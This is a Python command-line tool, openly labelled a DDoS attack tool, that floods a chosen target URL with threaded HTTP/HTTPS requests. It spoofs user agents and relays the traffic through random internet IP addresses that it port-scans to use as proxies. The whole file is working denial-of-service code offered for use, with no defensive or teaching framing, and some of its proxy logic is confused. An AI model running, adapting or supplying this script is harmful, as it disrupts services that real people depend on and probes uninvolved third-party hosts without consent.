import socket
import threading
import random
import time
import ssl
import argparse
from urllib.parse import urlparse
import logging
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class DDoSAttack:
    def __init__(self, target_url, duration, port, threads):
        self.target_url = target_url
        self.attack_duration = duration
        self.port = port
        self.threads = threads
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        self.start_time = None
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()

    def generate_random_proxy(self):
        """Generate a random proxy IP:Port"""
        ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        port = random.choice([80, 8080, 3128, 8888, 8000])
        return f"{ip}:{port}"

    def is_proxy_valid(self, proxy):
        """Check if proxy is valid (simulated)"""
        try:
            proxy_host, proxy_port = proxy.split(':')
            proxy_port = int(proxy_port)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # Faster timeout for validation
            result = sock.connect_ex((proxy_host, proxy_port))
            sock.close()
            
            return result == 0
        except:
            return False

    def send_request(self, proxy=None):
        """Send HTTP/HTTPS request through proxy"""
        try:
            parsed_url = urlparse(self.target_url)
            host = parsed_url.netloc
            path = parsed_url.path or '/'
            query = parsed_url.query
            if query:
                path += '?' + query
            
            scheme = parsed_url.scheme.lower()
            port = self.port if scheme == 'http' else 443
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if proxy:
                # Connect through proxy
                proxy_host, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)
                
                if scheme == 'https':
                    # CONNECT tunnel for HTTPS
                    sock.connect((proxy_host, proxy_port))
                    sock.send(f"CONNECT {host}:443 HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
                    response = sock.recv(4096)
                    if b'200 Connection Established' not in response:
                        with self.lock:
                            self.fail_count += 1
                        return
                else:
                    # Direct connection for HTTP
                    sock.connect((proxy_host, proxy_port))
                    # Send regular HTTP request through proxy
                    sock.send(f"GET {self.target_url} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            else:
                # Direct connection without proxy
                sock.connect((host, port))
            
            # Wrap socket for HTTPS
            if scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Create random request headers
            headers = {
                "Host": host,
                "User-Agent": random.choice(self.user_agents),
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Connection": "keep-alive"
            }
            
            # Build request
            request_lines = [f"GET {path} HTTP/1.1"]
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
            request_lines.append("\r\n")
            request = "\r\n".join(request_lines).encode()
            
            # Send request
            sock.sendall(request)
            
            # Receive response
            response = sock.recv(4096)
            
            if b'HTTP/' in response:
                with self.lock:
                    self.success_count += 1
                    logging.debug(Fore.GREEN + f"Successfully received response from {host}")
            else:
                with self.lock:
                    self.fail_count += 1
                    logging.warning(Fore.YELLOW + f"Unexpected response from {host}")
            
            sock.close()
            
            with self.lock:
                self.total_requests += 1
                
        except Exception as e:
            with self.lock:
                self.fail_count += 1
            logging.error(Fore.RED + f"Failed to send request through proxy {proxy}: {str(e)}")

    def attack_loop(self):
        """Main attack loop"""
        while time.time() - self.start_time < self.attack_duration:
            proxy = self.generate_random_proxy()
            
            # Validate proxy before use
            if not self.is_proxy_valid(proxy):
                with self.lock:
                    self.fail_count += 1
                continue
                
            try:
                self.send_request(proxy)
                # Rate limiting
                time.sleep(0.05)  # Adjust this value to control speed
            except Exception as e:
                logging.error(Fore.RED + f"Error in attack loop: {e}")

    def print_status(self):
        """Print attack status periodically"""
        while time.time() - self.start_time < self.attack_duration:
            elapsed = time.time() - self.start_time
            rps = self.total_requests / elapsed if elapsed > 0 else 0
            
            status = (
                f"{Fore.CYAN}Elapsed: {elapsed:.1f}s | "
                f"{Fore.GREEN}Success: {self.success_count} | "
                f"{Fore.RED}Failed: {self.fail_count} | "
                f"{Fore.YELLOW}Total: {self.total_requests} | "
                f"{Fore.BLUE}RPS: {rps:.1f}"
            )
            
            print(status, end='\r')
            time.sleep(1)

    def print_attack_report(self):
        """Print final attack report"""
        print("\n" + "="*60)
        print(f"{Fore.CYAN}Attack Completed on {self.target_url}")
        print(f"{Fore.GREEN}Successful Requests: {self.success_count}")
        print(f"{Fore.RED}Failed Requests: {self.fail_count}")
        print(f"{Fore.YELLOW}Total Requests Sent: {self.total_requests}")
        elapsed = time.time() - self.start_time
        print(f"{Fore.BLUE}Duration: {elapsed:.2f} seconds")
        print(f"{Fore.MAGENTA}Requests Per Second: {self.total_requests / elapsed:.2f}")
        print("="*60)

    def start_attack(self):
        """Start the DDoS attack"""
        self.start_time = time.time()
        logging.info(Fore.CYAN + f"Starting attack on {self.target_url} for {self.attack_duration} seconds")
        
        # Start status update thread
        status_thread = threading.Thread(target=self.print_status)
        status_thread.daemon = True
        status_thread.start()
        
        # Create and start attack threads
        threads_list = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_loop)
            thread.daemon = True
            threads_list.append(thread)
            thread.start()
            logging.info(Fore.YELLOW + f"Thread {i+1} started")
        
        # Wait for attack duration
        while time.time() - self.start_time < self.attack_duration:
            time.sleep(1)
        
        self.print_attack_report()
        logging.info(Fore.CYAN + "Attack completed successfully")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced DDoS Attack Tool with Random Proxies")
    parser.add_argument("target", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of attack threads")
    
    args = parser.parse_args()
    
    print(Fore.MAGENTA + """
    #############################################
    #          Advanced DDoS Attack Tool        #
    #         Random Proxy Generation Edition   #
    #############################################
    """)
    
    # Start the attack
    attack = DDoSAttack(
        target_url=args.target,
        duration=args.duration,
        port=args.port,
        threads=args.threads
    )
    
    try:
        attack.start_attack()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user")
        attack.print_attack_report()
    except Exception as e:
        print(Fore.RED + f"\n[!] Critical error: {e}")
